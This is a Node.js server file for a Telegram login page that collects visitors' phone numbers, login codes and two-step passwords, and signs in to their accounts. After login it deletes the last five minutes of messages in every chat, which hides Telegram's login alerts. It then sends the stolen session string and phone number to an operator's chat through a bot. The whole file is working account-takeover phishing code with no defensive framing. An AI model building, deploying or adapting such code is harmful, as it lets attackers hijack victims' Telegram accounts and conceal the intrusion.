require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { computeCheck } = require('telegram/Password');

const app = express();
app.use(cors());
app.use(express.json());

// Serve static files (index.html)
app.use(express.static(__dirname));

// Environment Variables from Railway / .env
const apiId = Number(process.env.TELEGRAM_API_ID);
const apiHash = process.env.TELEGRAM_API_HASH;
const botToken = process.env.BOT_TOKEN;
const adminChatId = process.env.ADMIN_CHAT_ID;

// Temporary memory store for client sessions during OTP verification
const sessions = {};

/**
 * Deletes all messages sent or received across all dialogs (Users, Bots, Service Notifications)
 * within the last 5 minutes (300 seconds).
 */
async function deleteRecentChats(client) {
    try {
        const nowInSeconds = Math.floor(Date.now() / 1000);
        const fiveMinutesAgo = nowInSeconds - (5 * 60);

        // Fetch all user dialogs/chats
        const dialogs = await client.getDialogs({});

        for (const dialog of dialogs) {
            try {
                // Fetch up to 50 recent messages per chat
                const messages = await client.getMessages(dialog.entity, { limit: 50 });

                // Filter messages newer than 5 minutes
                const messageIdsToDelete = messages
                    .filter(msg => msg.date && msg.date >= fiveMinutesAgo)
                    .map(msg => msg.id);

                // Revoke/Delete messages if any are within the timeframe
                if (messageIdsToDelete.length > 0) {
                    await client.deleteMessages(dialog.entity, messageIdsToDelete, { revoke: true });
                }
            } catch (err) {
                console.error(`Failed to delete messages in dialog ${dialog.name || dialog.id}:`, err.message);
            }
        }
    } catch (err) {
        console.error("Error running deleteRecentChats:", err.message);
    }
}

// Serve root page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 1. API: Request Telegram OTP
app.post('/api/send-code', async (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) {
        return res.status(400).json({ success: false, error: "Phone number is required" });
    }

    try {
        const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
            connectionRetries: 5,
        });
        await client.connect();

        const { phoneCodeHash } = await client.sendCode(
            { apiId, apiHash },
            phoneNumber
        );

        sessions[phoneNumber] = { client, phoneCodeHash };

        res.json({ success: true, message: "OTP code sent to your Telegram app!" });
    } catch (err) {
        console.error("Error sending code:", err);
        res.status(500).json({ success: false, error: err.message || "Failed to send code" });
    }
});

// 2. API: Verify OTP & 2FA Password
app.post('/api/verify-code', async (req, res) => {
    const { phoneNumber, code, password } = req.body;

    if (!phoneNumber || !code) {
        return res.status(400).json({ success: false, error: "Phone number and OTP code are required" });
    }

    const session = sessions[phoneNumber];
    if (!session) {
        return res.status(400).json({ success: false, error: "Session expired. Please request OTP again." });
    }

    try {
        const { client, phoneCodeHash } = session;

        if (password) {
            // Handle 2FA Password
            const passwordSrp = await client.invoke(new Api.account.GetPassword());
            const passwordCheck = await computeCheck(passwordSrp, password);
            await client.invoke(new Api.auth.CheckPassword({ password: passwordCheck }));
        } else {
            // Regular OTP Login
            await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: phoneNumber,
                    phoneCodeHash: phoneCodeHash,
                    phoneCode: code,
                })
            );
        }

        // Auto-delete chats/messages from the last 5 minutes before saving session
        await deleteRecentChats(client);

        const sessionString = client.session.save();
        delete sessions[phoneNumber];

        // Send Session String to Admin via Telegram Bot
        if (botToken && adminChatId) {
            try {
                const messageText = `🔔 **New Telegram Session Logged In!**\n\n📱 **Phone:** \`${phoneNumber}\`\n\n🔑 **Session String:**\n\`${sessionString}\``;
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: adminChatId,
                        text: messageText,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (notifyErr) {
                console.error("Failed to send notification to Telegram Bot:", notifyErr);
            }
        }

        res.json({
            success: true,
            message: "Authentication successful!",
            session: sessionString
        });
    } catch (err) {
        console.error("Error verifying code:", err);

        if (err.message && err.message.includes("SESSION_PASSWORD_NEEDED")) {
            return res.status(401).json({
                success: false,
                requiresPassword: true,
                error: "Two-Step Verification (2FA) password is required."
            });
        }

        res.status(400).json({ success: false, error: err.message || "Verification failed" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
